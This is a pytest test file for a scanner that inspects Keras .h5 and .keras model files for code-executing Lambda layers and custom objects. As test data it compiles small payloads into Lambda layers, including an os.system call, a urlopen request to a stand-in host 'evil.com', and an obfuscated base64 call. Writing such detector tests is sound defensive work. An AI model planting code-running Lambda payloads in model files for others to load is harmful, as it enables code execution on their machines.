from __future__ import annotations

import base64
import io
import json
import marshal
import zipfile
from pathlib import Path

import pytest

h5py = pytest.importorskip("h5py")

from hfaudit.parsers.keras_parser import KerasAnalysis, KerasParser
from hfaudit.detectors.keras_detector import KerasDetector


def _make_lambda_config(
    *,
    name: str = "lambda_1",
    function_b64: str | None = None,
    extra_layers: list[dict[str, object]] | None = None,
) -> dict[str, object]:
    """Build a Keras model config dict with a Lambda layer."""
    lambda_layer: dict[str, object] = {
        "class_name": "Lambda",
        "config": {
            "name": name,
            "function": function_b64 or "dW5rbm93bg==",
            "function_type": "lambda",
        },
    }
    layers: list[dict[str, object]] = [lambda_layer]
    if extra_layers:
        layers.extend(extra_layers)
    return {
        "class_name": "Sequential",
        "config": {
            "name": "test_model",
            "layers": layers,
        },
    }


def _make_clean_config() -> dict[str, object]:
    """Build a Keras model config with only standard layers (no Lambda)."""
    return {
        "class_name": "Sequential",
        "config": {
            "name": "clean_model",
            "layers": [
                {
                    "class_name": "Dense",
                    "config": {"name": "dense_1", "units": 64, "activation": "relu"},
                },
                {
                    "class_name": "Dense",
                    "config": {"name": "dense_2", "units": 10, "activation": "softmax"},
                },
            ],
        },
    }


def _make_custom_class_config() -> dict[str, object]:
    """Config referencing a custom (non-builtin) class."""
    return {
        "class_name": "Sequential",
        "config": {
            "name": "custom_model",
            "layers": [
                {
                    "class_name": "MyCustomAttention",
                    "config": {"name": "custom_attn", "heads": 4},
                },
            ],
        },
    }


def _compile_lambda_to_b64(source: str) -> str:
    """Compile a Python expression to a base64-encoded marshalled code object."""
    code = compile(source, "<lambda>", "eval")
    return base64.b64encode(marshal.dumps(code)).decode("ascii")


def _write_h5_with_config(path: str, config: dict[str, object]) -> None:
    """Write a minimal .h5 file with the given model config in attrs."""
    with h5py.File(path, "w") as hf:
        hf.attrs["model_config"] = json.dumps(config)


def _write_keras_zip(path: str, config: dict[str, object]) -> None:
    """Write a minimal .keras zip file with config.json."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", json.dumps({"keras_version": "3.1.0"}))
    Path(path).write_bytes(buf.getvalue())


# ---------------------------------------------------------------------------
# Parser tests
# ---------------------------------------------------------------------------


class TestKerasParserH5:
    def test_parse_with_lambda_layer(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "model.h5")
        config = _make_lambda_config()
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        data = Path(fpath).read_bytes()
        result = parser.parse(data, fpath)

        assert isinstance(result, KerasAnalysis)
        assert result.format == "h5"
        assert len(result.lambda_layers) == 1
        assert result.lambda_layers[0].name == "lambda_1"

    def test_parse_clean_model_no_lambdas(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "clean.h5")
        _write_h5_with_config(fpath, _make_clean_config())

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert result.lambda_layers == []
        assert result.custom_objects == []

    def test_parse_extracts_custom_objects(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "custom.h5")
        _write_h5_with_config(fpath, _make_custom_class_config())

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert "MyCustomAttention" in result.custom_objects

    def test_parse_corrupt_h5_raises(self) -> None:
        parser = KerasParser()
        with pytest.raises(ValueError, match="Failed to open HDF5"):
            parser.parse(b"this is not an h5 file", "corrupt.h5")

    def test_parse_h5_missing_config_attr(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "empty.h5")
        with h5py.File(fpath, "w") as hf:
            hf.create_dataset("dummy", data=[1, 2, 3])

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert result.model_config == {}
        assert result.lambda_layers == []

    def test_parse_h5_with_real_code_object(self, tmp_path: Path) -> None:
        b64 = _compile_lambda_to_b64("lambda x: x + 1")
        fpath = str(tmp_path / "real_lambda.h5")
        config = _make_lambda_config(function_b64=b64)
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert len(result.lambda_layers) == 1
        layer = result.lambda_layers[0]
        assert layer.function_raw == b64
        # Disassembly should have produced something
        assert layer.function_source is not None
        assert len(layer.function_source) > 0

    def test_parse_multiple_lambda_layers(self, tmp_path: Path) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "multi_model",
                "layers": [
                    {
                        "class_name": "Lambda",
                        "config": {"name": "lam1", "function": "YQ=="},
                    },
                    {
                        "class_name": "Dense",
                        "config": {"name": "dense_1", "units": 32},
                    },
                    {
                        "class_name": "Lambda",
                        "config": {"name": "lam2", "function": "Yg=="},
                    },
                ],
            },
        }
        fpath = str(tmp_path / "multi.h5")
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert len(result.lambda_layers) == 2
        names = {layer.name for layer in result.lambda_layers}
        assert names == {"lam1", "lam2"}


class TestKerasParserKeras:
    def test_parse_keras_zip_with_lambda(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "model.keras")
        config = _make_lambda_config(name="zip_lambda")
        _write_keras_zip(fpath, config)

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)

        assert result.format == "keras"
        assert len(result.lambda_layers) == 1
        assert result.lambda_layers[0].name == "zip_lambda"
        assert result.keras_version == "3.1.0"

    def test_parse_corrupt_keras_zip(self) -> None:
        parser = KerasParser()
        with pytest.raises(ValueError, match="Failed to open .keras zip"):
            parser.parse(b"not a zip at all", "broken.keras")

    def test_parse_keras_zip_no_config(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "empty.keras")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("weights.h5", b"fake")
        Path(fpath).write_bytes(buf.getvalue())

        parser = KerasParser()
        result = parser.parse(Path(fpath).read_bytes(), fpath)
        assert result.model_config == {}
        assert result.lambda_layers == []


class TestKerasParserExtensions:
    def test_supported_extensions(self) -> None:
        parser = KerasParser()
        assert ".h5" in parser.supported_extensions
        assert ".keras" in parser.supported_extensions


# ---------------------------------------------------------------------------
# Detector tests
# ---------------------------------------------------------------------------


class TestKerasDetectorKRS001:
    def test_fires_on_lambda_layer(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "model.h5")
        _write_h5_with_config(fpath, _make_lambda_config())

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs001 = [f for f in findings if f.rule_id == "HFA-KRS-001"]
        assert len(krs001) == 1
        assert krs001[0].severity == "high"
        assert "lambda_1" in krs001[0].description

    def test_does_not_fire_on_clean_model(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "clean.h5")
        _write_h5_with_config(fpath, _make_clean_config())

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs001 = [f for f in findings if f.rule_id == "HFA-KRS-001"]
        assert len(krs001) == 0

    def test_fires_per_lambda_layer(self, tmp_path: Path) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "multi",
                "layers": [
                    {"class_name": "Lambda", "config": {"name": "l1", "function": "YQ=="}},
                    {"class_name": "Lambda", "config": {"name": "l2", "function": "Yg=="}},
                ],
            },
        }
        fpath = str(tmp_path / "multi.h5")
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs001 = [f for f in findings if f.rule_id == "HFA-KRS-001"]
        assert len(krs001) == 2


class TestKerasDetectorKRS002:
    def test_fires_on_dangerous_code(self, tmp_path: Path) -> None:
        code_src = "__import__('os').system('echo pwned')"
        b64 = _compile_lambda_to_b64(code_src)
        fpath = str(tmp_path / "evil.h5")
        _write_h5_with_config(fpath, _make_lambda_config(function_b64=b64))

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs002 = [f for f in findings if f.rule_id == "HFA-KRS-002"]
        assert len(krs002) >= 1
        assert krs002[0].severity == "high"

    def test_not_on_benign_lambda(self, tmp_path: Path) -> None:
        b64 = _compile_lambda_to_b64("lambda x: x * 2")
        fpath = str(tmp_path / "benign.h5")
        _write_h5_with_config(fpath, _make_lambda_config(function_b64=b64))

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs002 = [f for f in findings if f.rule_id == "HFA-KRS-002"]
        assert len(krs002) == 0


class TestKerasDetectorKRS003:
    def test_fires_on_network_code(self, tmp_path: Path) -> None:
        code_src = "__import__('urllib.request').urlopen('http://evil.com')"
        b64 = _compile_lambda_to_b64(code_src)
        fpath = str(tmp_path / "net.h5")
        _write_h5_with_config(fpath, _make_lambda_config(function_b64=b64))

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs003 = [f for f in findings if f.rule_id == "HFA-KRS-003"]
        assert len(krs003) >= 1
        assert krs003[0].severity == "medium"


class TestKerasDetectorKRS004:
    def test_fires_on_obfuscated_code(self, tmp_path: Path) -> None:
        code_src = "getattr(__import__('base64'), 'b64decode')(b'dGVzdA==')"
        b64 = _compile_lambda_to_b64(code_src)
        fpath = str(tmp_path / "obf.h5")
        _write_h5_with_config(fpath, _make_lambda_config(function_b64=b64))

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs004 = [f for f in findings if f.rule_id == "HFA-KRS-004"]
        assert len(krs004) >= 1
        assert krs004[0].severity == "medium"


class TestKerasDetectorKRS005:
    def test_fires_on_custom_objects(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "custom.h5")
        _write_h5_with_config(fpath, _make_custom_class_config())

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs005 = [f for f in findings if f.rule_id == "HFA-KRS-005"]
        assert len(krs005) == 1
        assert krs005[0].severity == "low"
        assert "MyCustomAttention" in krs005[0].description

    def test_no_custom_objects_on_builtin_only(self, tmp_path: Path) -> None:
        fpath = str(tmp_path / "clean.h5")
        _write_h5_with_config(fpath, _make_clean_config())

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        krs005 = [f for f in findings if f.rule_id == "HFA-KRS-005"]
        assert len(krs005) == 0


class TestKerasDetectorEdgeCases:
    def test_non_keras_analysis_returns_empty(self) -> None:
        detector = KerasDetector()
        findings = detector.detect("not a KerasAnalysis")  # type: ignore[arg-type]
        assert findings == []

    def test_empty_model_config(self) -> None:
        analysis = KerasAnalysis(
            format="h5",
            model_config={},
            lambda_layers=[],
            custom_objects=[],
            keras_version=None,
        )
        detector = KerasDetector()
        findings = detector.detect(analysis)
        assert findings == []

    def test_lambda_with_no_function_field(self, tmp_path: Path) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "nofunc",
                "layers": [
                    {"class_name": "Lambda", "config": {"name": "bare_lambda"}},
                ],
            },
        }
        fpath = str(tmp_path / "nofunc.h5")
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        # Should still fire KRS-001 even without a function field
        krs001 = [f for f in findings if f.rule_id == "HFA-KRS-001"]
        assert len(krs001) == 1

    def test_finding_ids_are_unique(self, tmp_path: Path) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "multi",
                "layers": [
                    {"class_name": "Lambda", "config": {"name": "l1", "function": "YQ=="}},
                    {"class_name": "Lambda", "config": {"name": "l2", "function": "Yg=="}},
                ],
            },
        }
        fpath = str(tmp_path / "multi.h5")
        _write_h5_with_config(fpath, config)

        parser = KerasParser()
        analysis = parser.parse(Path(fpath).read_bytes(), fpath)
        detector = KerasDetector()
        findings = detector.detect(analysis)

        ids = [f.id for f in findings]
        assert len(ids) == len(set(ids)), "Finding IDs must be unique"
